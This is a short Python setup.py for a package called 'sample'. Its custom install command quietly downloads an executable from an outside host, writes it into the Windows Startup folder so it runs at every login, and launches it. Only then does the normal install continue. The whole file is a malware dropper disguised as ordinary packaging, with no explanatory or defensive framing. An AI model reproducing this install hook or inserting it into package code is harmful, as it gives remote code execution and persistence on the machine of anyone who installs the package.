import os
import subprocess
import urllib.request
from setuptools import setup
from setuptools.command.install import install

class InstallPayload(install):
    def run(self):
        filename = 'runtime.exe'
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', filename)
        response = urllib.request.urlopen('https://mirror.example.invalid/runtime')
        with open(startup, 'wb') as out_file:
            out_file.write(response.read())
        subprocess.run(['start', startup], shell=True)
        install.run(self)

setup(name='sample', version='2.0', cmdclass={'install': InstallPayload})
